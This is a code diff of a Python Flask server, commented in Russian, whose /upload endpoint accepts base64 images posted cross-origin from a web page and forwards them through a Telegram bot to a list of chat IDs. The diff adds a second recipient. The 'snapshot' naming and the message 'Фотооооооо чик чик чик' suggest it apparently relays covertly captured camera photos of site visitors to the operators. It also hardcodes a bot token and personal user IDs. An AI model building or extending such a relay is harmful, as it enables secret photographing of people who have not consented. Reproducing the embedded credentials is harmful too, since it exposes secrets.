@@ -6,12 +6,14 @@ import io
 
 # ТВОИ ДАННЫЕ
 TOKEN = '8638103577:AAE1Tvw-PXhnVzNHBsqMEJWVV-DCkUBJK0c'
-# Сюда впиши свой ID из @userinfobot (просто цифры без кавычек)
-MY_ID = 7169470694
+
+# Список ID (через запятую)
+# Замени 123456789 на реальный ID второго человека
+ADMIN_IDS = [7169470694, 5087998181] 
 
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
-CORS(app) # Это чтобы сайт не ругался на безопасность при отправке
+CORS(app) 
 
 @app.route('/upload', methods=['POST'])
 def upload():
@@ -21,13 +23,18 @@ def upload():
         header, encoded = data.split(",", 1)
         data_bytes = base64.b64decode(encoded)
         
-        # Готовим фото для отправки в ТГ
-        photo = io.BytesIO(data_bytes)
-        photo.name = 'snapshot.jpg'
-
-        # Отправляем тебе в Телеграм
-        bot.send_message(MY_ID, "Фотооооооо чик чик чик")
-        bot.send_photo(MY_ID, photo)
+        # Перебираем все ID из нашего списка
+        for user_id in ADMIN_IDS:
+            try:
+                # Создаем объект фото заново для каждой отправки
+                photo = io.BytesIO(data_bytes)
+                photo.name = 'snapshot.jpg'
+                
+                # Отправляем сообщение и фото конкретному пользователю
+                bot.send_message(user_id, "Фотооооооо чик чик чик")
+                bot.send_photo(user_id, photo)
+            except Exception as e:
+                print(f"Не удалось отправить пользователю {user_id}: {e}")
         
         return jsonify({"status": "ok"}), 200
     except Exception as e:
